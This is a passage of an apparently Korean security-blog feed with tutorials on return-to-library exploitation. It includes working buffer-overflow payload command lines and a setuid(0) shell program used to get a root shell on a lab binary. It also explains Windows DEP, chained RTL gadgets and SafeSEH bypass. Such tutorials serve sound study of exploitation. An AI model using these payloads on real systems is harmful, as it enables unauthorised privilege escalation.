  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-6.png&quot; alt=&quot;[그림 4-6]&quot; /&gt;
&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = &lt;strong&gt;0x42127ea4&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;최종적으로 system() 과 /bin/sh 의 주소값을 찾아냈습니다. 이제 찾아낸 정보를 바탕으로 공격 페이로드를 작성해 보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;AAAA&quot;*11 + &quot;\xc0\xf2\x03\x42&quot; + &quot;AAAA&quot; + &quot;\xa4\x7e\x12\x42&quot;'`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;마지막으로 페이로드를 정리 하고 직접 때려보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-7.png&quot; alt=&quot;[그림 4-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저 버버 크기(40byte)와 sfp(4byte) 를 채워 주고 공유 라이브러리에 위치한 system() 함수를 저장시킵니다. 다음 위치에는 AAAA의 4byte를 채워 줍니다. 이유는 위에서 알려 드렸듯 system()의 인자값은 8byte 뒤에 위치하기에 그 거리만큼 벌려 주고 우리가 필요로 하는 /bin/sh을 위치 시켜 줌으로서 system()이 인자값으로 /bin/sh을 정상적으로 받을수 있게 설계해준겁니다.&lt;/p&gt;

&lt;p&gt;설명은 이쯤 해두고 직접 떄려보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-8.png&quot; alt=&quot;[그림 4-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;shell이 떨어지네요. 지금 한 방식처럼 system() 내부의 /bin/sh 문자열을 찾는 방법도 있고 전 포스팅에서 했던 환경변수를 이용 하는 방법도 있습니다. 빠르게 보고 넘어가죠.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-9.png&quot; alt=&quot;[그림 4-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위에서 설명 드렸듯 bof라는 환경변수에 /bin/sh 문자열을 저장하고 해당 환경변수의 주소를 확인합니다. 아래쪽은 bof 환경변수의 동작 여부를 확인 했습니다.&lt;/p&gt;

&lt;p&gt;system()의 주소는 알고 있으니 환경변수의 주소만 추가해서 바로 페이로드를 작성하고 떄려봅시다&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-10.png&quot; alt=&quot;[그림 4-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;shell은 마찬가지로 잘 떨어집니다만…우리가 원하는 root 권한이 아니라서 아쉽습니다…..ㅠ 아쉬움을 달래봅시다.&lt;/p&gt;

&lt;p&gt;우선 system()의 근본적인 문제를 알아 봅시다.&lt;/p&gt;

&lt;p&gt;system()의 경우 내부적으로 &lt;strong&gt;/bin/sh -c argument&lt;/strong&gt;를 실행합니다.
따라서 &lt;strong&gt;/bin/sh -c /bin/sh&lt;/strong&gt; 로 처리가 되며, root 권한을 얻는것은 system()의 내부에서 /bin/sh를 실행 후 다시 /bin/sh을 실행하기에 불가능합니다. 
따라서 &lt;strong&gt;setuid()&lt;/strong&gt;함수 를 0으로 셋팅해주고 system()가 실행되도록 하여 &lt;strong&gt;미리 실행전에 root 권한으로 준비시킨 후 system()을 실행&lt;/strong&gt;시킨다면 가능하며 system() 함수의 주소가 아닌 다른 함수가 필요한데 그것이 &lt;strong&gt;execl()&lt;/strong&gt;함수입니다.
먼저 setuid()를 셋팅해 줄 소스부터 작성 해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01 #include &amp;lt;stdio.h&amp;gt;
02 
03 int main(){
04   setuid(0);
05 	 system(&quot;/bin/sh&quot;);
06   return 0;
07 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;해당 파일을 컴파일해주시고 마찬가지로 환경변수에 저장 해줍니다. execl()의 주소도 위에서 system() 주소값을 찾았던 방식으로 찾아주시면 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-11.png&quot; alt=&quot;[그림 4-11]&quot; /&gt;
&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;execl()&lt;/strong&gt; 주소 = &lt;strong&gt;0x420acaa0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;새로 작성한 &lt;strong&gt;/tmp/bof1/rootsh&lt;/strong&gt; 주소 = &lt;strong&gt;??&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이제 페이로드를 짜야 하는데 한가지 주의점은 execl()은 끝에 null로 끝나야 합니다.
execl(const char *path, const char *arg0, const char *arg1, const char *arg2,…const char *argn, (char *)0);의 형태로 구성 되있는데 조금더 보기 쉽게 하자면
execl(경로, 인자1, 인자2….인자n, null) 이라고 이해하시면 됩니다. 마지막은 인자의 끝을 의미로 null값이 위치하게 됩니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;AAAA&quot;*11 + &quot;execl주소&quot; + &quot;AAAA&quot; + &quot;rootsh 주소&quot;'`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;공격 페이로드는 위와 같이 구성 될것입니다.&lt;/p&gt;

&lt;p&gt;페이로드 전에 execl()을 사용하기 위해 메모리 상태를 봐야합니다. 이유는 끝이 null값으로 끝나는 적당한 지점을 골라야 하기 때문입니다. 직접 보는게 이해하기 빠를겁니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-12.png&quot; alt=&quot;[그림 4-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위에서 그림과 같이 BBBB는 execl()의 주소가 되며(파란색) CCCC는 불필요한 값이며(초록색) DDDD가 새로 작성한 rootsh의 주소(노란색)가 됩니다. 위에서 execl()의 인자값의 형태를 봤습니다. 경로 + 인자1 + 인자2 +인자n + NULL의 형태를 띄우며 DDDD 하나는 경로에 들어가며 DDDD가 하나더 들어가면 인자 1에 들어갑니다. 그렇다는 것은 마지막이 마지막으로 DDDD의 뒤의 한 바이트는 NULL이 되어야 4바이트가 전부 NULL로 자리를 잡게 됩니다. 다음 그림과 위 그림의 하늘색 박스의 1byte값인 2c를 확인해보면 무슨 말인지 이해 되실거라 생각 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-13.png&quot; alt=&quot;[그림 4-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;상단에 입력한 페이로드를 보면 DDDD를 &lt;em&gt;2 했으며 아래쪽에 하늘색 박스가 2c가 아닌 00으로 바뀌었음을 확인 간으합니다. 즉 DDDD DDDD가 들어간 다음 1byte는 NULL로 바꾸게 됩니다. 이제 DDDD&lt;/em&gt;3을 입력하여 우리가 원하는 0xbffffe4a0(보라색)의 값이 바뀌는지 확인하도록 합시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-14.png&quot; alt=&quot;[그림 4-14]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;우리가 원하는 모양으로 메모리 값이 바뀌는걸 확인 했으니 페이로드를 다시 정리 해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 &quot;`python -c 'print &quot;AAAA&quot;*11 + &quot;\xa0\xca\x0a\x42&quot; + &quot;AAAA&quot; + &quot;rootsh 주소&quot;*3'`&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이제 rootsh 의 주소를 알아내고 *3만 붙여주면 될 듯 합니다. 고지가 보이네요.&lt;/p&gt;

&lt;p&gt;위에서 작성하고 컴파일한 rootsh를 주소가 변하지않는 값을 찾아서 심볼릭 링크를 걸어줘야 합니다. 변하지 않는 곳은 Data segment 영역입니다.&lt;/p&gt;

&lt;p&gt;Data segment 영역의 주소는 0x08049000 부터 시작합니다. 해당 주소를 dbg를 이용해서 열어보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-15.png&quot; alt=&quot;[그림 4-15]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x08049014 주소의 값이 0x01(=0x00000001)을 갖고있습니다. 다른 값을 쓰셔도 됩니다만 입력에 있어서 편안한 간단한 값을 선택 합니다. 0x08049014 = 0x01 이라는것을 알아 두시면 됩니다. 이제 rootsh 코드와 0x01의 주소를 심볼릭 링크 시켜줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-16.png&quot; alt=&quot;[그림 4-16]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;자 이제 준비가 끝났습니다. 위에서 찾아본 내용을 바탕으로 페이로드를 재구성 해보겠습니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;execl()&lt;/strong&gt; 주소 = &lt;strong&gt;0x420acaa0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/tmp/bof1/rootsh 심볼릭 링크 주소&lt;/strong&gt; = &lt;strong&gt;0x08049014&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;[AAAA(44byte)] + [execl() 주소] + [잉여값(4byte)] + [rootsh sl 주소] 과 구성되며 실제 공격 페이로드는 아래와 같습니다.(공격 페이로드는 root 권한의 파일을 대상으로 확인하셔야 합니다.)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;../bof/bof1 &quot;`python -c 'print &quot;AAAA&quot;*11 + &quot;\xa0\xca\x0a\x42&quot; + &quot;AAAA&quot; 
+ &quot;\x14\x90\x04\x08&quot;*3'`&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이때 주의할 점은 페이로드 전체를 ““로 감싸야 합니다. \x0a를 \x00으로 인식하는 문제가 있어서 “&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'print .......'&lt;/code&gt;” 이런식로 감싸주셔야 똑바로 값이 들어갑니다. 꼭 ““으로 감싸주세요!&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-17.png&quot; alt=&quot;[그림 4-17]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;짜잔….개…root 권한으로 shell을 땄습니다. 
이번에도 역시나 간단하게 하고 싶었는데 고생도 하느라 이것저것 실수 했던것들 다 담느라 많이 길어졌네요…..ㅂㄷㅂㄷ….&lt;/p&gt;

&lt;p&gt;RTL이란 기법은 나중에 알아볼 ROP를 위한 초석입니다. 꼭 잘 숙지 해주셔야 합니다….. :(&lt;/p&gt;

&lt;p&gt;다음 포스팅은 Chaining RTL이란 것을 정말…간단히 볼 수 있도록 해보겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;뿅!&lt;/strong&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Sulla</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">RTL(Return to Library)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">windows-0x08</title>
      <link href="/windows-0x08" rel="alternate" type="text/html" title="windows-0x08" />
      <published>2019-03-19T20:18:00+09:00</published>
      <updated>2019-03-19T20:18:00+09:00</updated>
      <id>/windows-0x08</id>
      <content type="html" xml:base="/windows-0x08">&lt;h1 id=&quot;0x08-dep2&quot;&gt;0x08 DEP(2)&lt;/h1&gt;

&lt;h5 id=&quot;what-is-dep&quot;&gt;What is DEP?&lt;/h5&gt;

&lt;p&gt;지난 Post에서 RTL을 다루어 봤습니다.&lt;/p&gt;

&lt;p&gt;이번 시간에는 RTL에 이어 Chaining RTL에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;chaining-rtl&quot;&gt;Chaining RTL&lt;/h5&gt;

&lt;p&gt;Chaining RTL은 RTL이 Chain처럼 엮여서 반복되는 것을 말합니다.&lt;/p&gt;

&lt;p&gt;RTL이 뭐였죠? DEP가 적용되어 Shellcode를 실행할 수 없게 되었을 때, 라이브러리 함수로 점프하여&lt;/p&gt;

&lt;p&gt;내가 원하는 함수를 실행하는 것이었죠?&lt;/p&gt;

&lt;p&gt;Chaining RTL은 말 그대로 내가 원하는 함수를 계속해서 실행하는 것을 뜻합니다.&lt;/p&gt;

&lt;p&gt;의미는 알았으니, 본격적으로 알아볼텐데 STACK 구성에 집중해서 보시면 되겠습니다.&lt;/p&gt;

&lt;p&gt;먼저, 지난 시간처럼 몇 가지 가정을 하겠습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;func1(argv1) : 인자를 하나만 필요로 하는 함수&lt;/li&gt;
  &lt;li&gt;func2(argv1’, argv’2) : 인자를 두 개 필요로 하는 함수&lt;/li&gt;
  &lt;li&gt;func3(argv’‘1, argv’‘2, argv’‘3) : 인자를 세 개 필요로 하는 함수&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이 함수들을 차례대로 호출한다고 가정하고 이 때, Payload를 어떻게 구성해야하는 것인지를 살펴보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 그림 기억나시나요?? 지난 시간에 살펴봤던 함수를 하나만 호출할 때의 STACK 그림입니다.&lt;/p&gt;

&lt;p&gt;Main-ret가 다음 호출할 함수의 SFP로 변경되고 있죠? 그래서 그 다음 4 Byte가 호출된 함수가 종료되고 다음에 갈 곳의 주소인 것도 알고 있습니다.&lt;/p&gt;

&lt;p&gt;그럼 두 번째 함수(인자가 두 개)를 호출할 때 그림이 이렇게 되겠네요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_1.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Func1() 함수의 RET 자리에 Func2() 함수의 주소를 넣어줬습니다. 그럼 Func1() 함수가 종료된 후, Func2() 함수가 실행됩니다.&lt;/p&gt;

&lt;p&gt;간단하죠?&lt;/p&gt;

&lt;p&gt;그런데 여기엔 문제가 있습니다. 이 방법으로는 내가 원하는 함수를 마음껏 호출할 수가 없습니다.&lt;/p&gt;

&lt;p&gt;그냥 RET에 다른 함수 주소를 덮어주면 되는거 아니야? 라고 생각하실 수 있습니다.&lt;/p&gt;

&lt;p&gt;자, 그럼 다음에 Func3() 함수를 호출한다고 생각해봅시다.&lt;/p&gt;

&lt;p&gt;Func3() 함수의 주소는 어디에 넣어줘야 하죠?&lt;/p&gt;

&lt;p&gt;이미 Func1() 함수의 첫 번째 인자가 위치하고 있습니다. 이제 이해가 가시죠??&lt;/p&gt;

&lt;p&gt;이 한계를 해결하기 위해 지금부터는 Gadget을 사용할 겁니다.&lt;/p&gt;

&lt;p&gt;RET로 끝나는 많고 많은 Gadget 중에 시스템 해킹에서 주로 사용되는 Gadget은 다음 3가지 입니다.
(이것만 쓴다는 게 아닙니다!!)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;pr : POP RET&lt;/li&gt;
  &lt;li&gt;ppr : POP POP RET&lt;/li&gt;
  &lt;li&gt;pppr : POP POP POP RET&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;POP 뒤에 Operand는 생략했습니다.&lt;/p&gt;

&lt;p&gt;이 Gadget을 이용해서 내가 원하는만큼 함수를 호출하려면 STACK을 다음과 같이 구성하면 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_2.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;조금 이상하고 복잡한 듯이 느껴질 수 있는데, 에필로그 과정부터 Gadget 순으로 색깔별로 보시면 됩니다.&lt;/p&gt;

&lt;p&gt;먼저 에필로그부터 살펴보겠습니다.&lt;/p&gt;

&lt;p&gt;RETN이 실행되면 POP EIP, JMP EIP를 수행하므로 실행되고 난 후, ESP의 위치는 빨간 ESP 위치가 됩니다.&lt;/p&gt;

&lt;p&gt;JMP EIP가 실행되면 POP RETN이 실행되겠죠?&lt;/p&gt;

&lt;p&gt;처음 POP이 실행되면 STACK 최상단의 값을 꺼내고 ESP가 올라가면서 ESP의 위치는 파란 ESP 위치가 됩니다.&lt;/p&gt;

&lt;p&gt;다시 RETN이 실행되면 POP EIP, JMP EIP가 실행되겠네요.&lt;/p&gt;

&lt;p&gt;그럼 그 때의 ESP는 초록색 위치가 되는데 POP EIP를 했으므로 EIP엔 두 번째 함수 Func2()의 주소가 들어가게 될 것이고&lt;/p&gt;

&lt;p&gt;JMP EIP를 하면서 Func2() 함수가 실행됩니다.&lt;/p&gt;

&lt;p&gt;세 번째 함수까지 모두 호출한다고 가정했을 때, STACK의 구조는 다음과 같이 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_3.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이런 식으로 STACK을 구성해서 내가 원하는 함수를 계속해서 호출하는 기법을 Chaining RTL이라고 부릅니다.&lt;/p&gt;

&lt;p&gt;자, 이제 ROP를 하기 위한 기초 준비 작업을 모두 마쳤습니다.&lt;/p&gt;

&lt;p&gt;다음 Post에서 ROP를 알아보고 DEP편을 마무리 짓도록 하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x08 DEP(2)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">windows-0x07</title>
      <link href="/windows-0x07" rel="alternate" type="text/html" title="windows-0x07" />
      <published>2019-03-19T19:18:00+09:00</published>
      <updated>2019-03-19T19:18:00+09:00</updated>
      <id>/windows-0x07</id>
      <content type="html" xml:base="/windows-0x07">&lt;h1 id=&quot;0x07-dep1&quot;&gt;0x07 DEP(1)&lt;/h1&gt;

&lt;h5 id=&quot;what-is-dep&quot;&gt;What is DEP?&lt;/h5&gt;

&lt;p&gt;DEP는 특정 메모리의 실행 권한을 제거하여, 메모리에 올라온 Shellcode의 실행을 막는 메모리 보호 기법입니다.&lt;/p&gt;

&lt;p&gt;DEP는 Window XP Service Pack 2에서부터 적용된 기법이며, H/W 기반 DEP와 S/W 기반 DEP로 나눌 수 있습니다.&lt;/p&gt;

&lt;p&gt;이 두 가지 방식의 차이는 CPU가 하드웨어적으로 DEP를 지원 가능한가를 기준으로 나뉜다고 생각하시면 됩니다.&lt;/p&gt;

&lt;p&gt;CPU에서 지원 가능한 경우 H/W DEP라 하고, 그렇지 않은 경우 S/W로 그 기능을 지원하는 방식인 것이죠.&lt;/p&gt;

&lt;p&gt;최근 나온 CPU들은 대부분 H/W 기능을 지원하므로 일반적으로 DEP라고 하면 H/W DEP라고 생각하시면 됩니다.&lt;/p&gt;

&lt;p&gt;DEP에는 아래와 같이 4가지 종류의 옵션이 존재합니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OptIn : 지정된 Binary만 보호&lt;/li&gt;
  &lt;li&gt;OptOut : 지정된 Binary를 제외하고 보호&lt;/li&gt;
  &lt;li&gt;AlwaysOn : 모든 Process 항상 보호&lt;/li&gt;
  &lt;li&gt;AlwaysOff : 모든 Process 보호하지 않음&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OS를 설치한 후, 직접 변경한 적이 없다면 Default로 OptIn 옵션이 적용되어 있고 다음과 같이 확인할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;DEP가 적용되면 Shellcode를 STACK에 넣어서 실행해왔던 지금까지의 방법으로는 성공할 수가 없게 됩니다.&lt;/p&gt;

&lt;p&gt;하지만 이 기법 역시 우회가 가능하며, DEP를 우회하기 위해 필요한 기법과 개념들은 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Gadget&lt;/li&gt;
  &lt;li&gt;RTL&lt;/li&gt;
  &lt;li&gt;Chaining RTL&lt;/li&gt;
  &lt;li&gt;ROP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;지금부터 하나씩 살펴보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;gadget&quot;&gt;Gadget&lt;/h5&gt;

&lt;p&gt;Gadget이란 “mov esp, ebp” 등의 명령어 조각을 의미했었습니다.&lt;/p&gt;

&lt;p&gt;하지만 지금 시스템 해킹에서의 Gadget은 RET로 끝나는 명령어 조각을 의미하게 되었습니다.&lt;/p&gt;

&lt;p&gt;이 Gadget이 공격에서 왜 중요한지는 Chaining RTL과 ROP를 다루면서 이야기하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;rtl&quot;&gt;RTL&lt;/h5&gt;

&lt;p&gt;RTL은 Return to Library의 약자로 해석을 하면 Library로 돌아간다는 의미입니다.&lt;/p&gt;

&lt;p&gt;Library로 돌아간다?&lt;/p&gt;

&lt;p&gt;아까 앞에서 DEP가 적용되면 Shellcode를 실행할 수가 없다고 했었던 것 기억나시죠?&lt;/p&gt;

&lt;p&gt;그래서 RET를 Shellcode의 주소로 변조하는 것이 아니라, 실행 권한이 있을 수 밖에 없는 Library의 함수의 주소로 변조하는 것이죠.&lt;/p&gt;

&lt;p&gt;그리고!!!&lt;/p&gt;

&lt;p&gt;RTL에서 가장 중요한 것은 함수의 인자를 직접 생성해야 한다는 것입니다.&lt;/p&gt;

&lt;p&gt;Shellcode를 실행했을 때와는 다르게 이 방법은 RET 주소를 원하는 함수의 주소로 바꿔줬을 뿐이기 때문이죠.&lt;/p&gt;

&lt;p&gt;그 함수가 실행되기 위해서는 함수의 동작에 필요한 인자들이 있어야하겠죠?&lt;/p&gt;

&lt;p&gt;CPU가 알아서 자동으로 만들어 줄리가 없으니,,STACK에 직접 구성해줘야 합니다.&lt;/p&gt;

&lt;p&gt;인자를 1개만 취하는 함수 Func()가 있다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;RTL 기법으로 이 함수를 호출하기 위해서는 STACK을 다음과 같이 구성해야 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림에서 중간 STACK 그림을 보면 Func을 호출하기 위해 RET를 Func 함수의 주소로 변조하고, 그 위치에서 +8만큼 떨어진 곳에 함수의 인자를 구성한 것을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;그런데 왜 인자의 위치를 저렇게 구성해줘야 할까요?&lt;/p&gt;

&lt;p&gt;다음 그림을 보면서 설명해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;빨간 색으로 표시된 부분은 Main 함수의 에필로그 과정, 파란 색으로 표신된 부분은 Func 함수의 프롤로그 과정을 나타낸 것 입니다.&lt;/p&gt;

&lt;p&gt;먼저, 빨간 색. Main 함수의 에필로그 과정을 봅시다.&lt;/p&gt;

&lt;p&gt;POP EIP, JMP EIP를 코드를 수행했을 때의 위치가 가장 왼쪽 STACK에 표시된 ESP가 가르키는 곳 입니다.&lt;/p&gt;

&lt;p&gt;이후, JMP EIP 코드가 실행되면 새로운 함수가 실행되고 새 함수의 프롤로그 과정이 진행됩니다.&lt;/p&gt;

&lt;p&gt;프롤로그 과정의 일부인 PUSH EBP가 실행되면 새 STACK Frame의 기준점을 만듭니다.&lt;/p&gt;

&lt;p&gt;여기까지 진행된 후, STACK을 살펴봅시다.&lt;/p&gt;

&lt;p&gt;Main 함수의 RET가 뒤이어 실행되는 함수의 SFP 자리로 바뀐다는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 그 다음에, RET를 만들어주었습니다.&lt;/p&gt;

&lt;p&gt;RTL이 아니라 정상적인 방식인 CALL을 통해 함수가 실행된다면 STACK에 다음에 실행할 곳의 위치를 넣어줍니다.&lt;/p&gt;

&lt;p&gt;그런데 우리는 컴파일러가 만들어주는 것이 아니기 때문에 직접 만들어줘야 합니다.&lt;/p&gt;

&lt;p&gt;그래서 저 위치에 다음에 실행할 곳의 주소 역할을 할 값을 직접 넣어 구성해주는 것 입니다.&lt;/p&gt;

&lt;p&gt;쉽게 생각하면 컴파일러가 만들어주는 구조를 똑같이 흉내낸다고 생각하시면 되겠습니다.&lt;/p&gt;

&lt;p&gt;이것이 RTL의 전부입니다.&lt;/p&gt;

&lt;p&gt;다음은 디버거를 통해 RTL을 진행한 그림입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;잘 실행이 되네요^^&lt;/p&gt;

&lt;p&gt;그런데 이 방식은 실제 환경에서는 거의 불가능한 방법이라는 것도 알아두셔야 합니다.&lt;/p&gt;

&lt;p&gt;실제 환경에서는 ASLR, Safe SEH 등이 기본적으로 적용되어 있기 때문에 내가 원하는 함수의 주소를 찾아내기 힘들기 때문입니다.&lt;/p&gt;

&lt;p&gt;그래서 이 기법은 ROP를 위한 기본 개념 정도로만 이해하시기 바랍니다.&lt;/p&gt;

&lt;p&gt;글이 너무 길어졌네요. 이만 줄이고 다음 편에서 ROP를 알아보도록 하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x07 DEP(1)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">windows-0x06</title>
      <link href="/windows-0x06" rel="alternate" type="text/html" title="windows-0x06" />
      <published>2019-03-18T19:18:00+09:00</published>
      <updated>2019-03-18T19:18:00+09:00</updated>
      <id>/windows-0x06</id>
      <content type="html" xml:base="/windows-0x06">&lt;h1 id=&quot;0x06-gs2&quot;&gt;0x06 GS(2)&lt;/h1&gt;

&lt;h5 id=&quot;safeseh&quot;&gt;SafeSEH&lt;/h5&gt;

&lt;p&gt;SafeSEH는 SEH Overwite를 방어하기 위해 도입된 메모리 보호 기법입니다.&lt;/p&gt;

&lt;p&gt;SafeSEH가 하는 일은 아주 간단합니다.&lt;/p&gt;

&lt;p&gt;Exception Handler가 실행되기 전에 Handler 주소 값에 대한 검증을 수행합니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1) 등록된 Handler의 주소가 STACK인지 확인해서 STACK이면 호출하지 않음.&lt;/li&gt;
  &lt;li&gt;2) Handler의 주소가 현재 로드된 모듈의 주소이고, SafeSEH 컴파일이 되어 있다면 적절한 절차로 등록된 것인지 검증.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;까다롭죠??&lt;/p&gt;

&lt;p&gt;그런데 해법이 상당이 간단합니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1) Handler의 주소가 STACK이 아니면 된다.&lt;/li&gt;
  &lt;li&gt;2) SafeSEH 컴파일이 되어 있지 않으면 된다.&lt;/li&gt;
  &lt;li&gt;결론 : SafeSEH가 안걸려 있는 모듈에서 Gadget을 찾아오면 된다!!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;간단하죠?&lt;/p&gt;

&lt;p&gt;Immunity Debugger에서 mona.py를 이용하면 Module들에 어떤 보호기법들이 적용되어 있는지 확인할 수 있습니다.&lt;/p&gt;

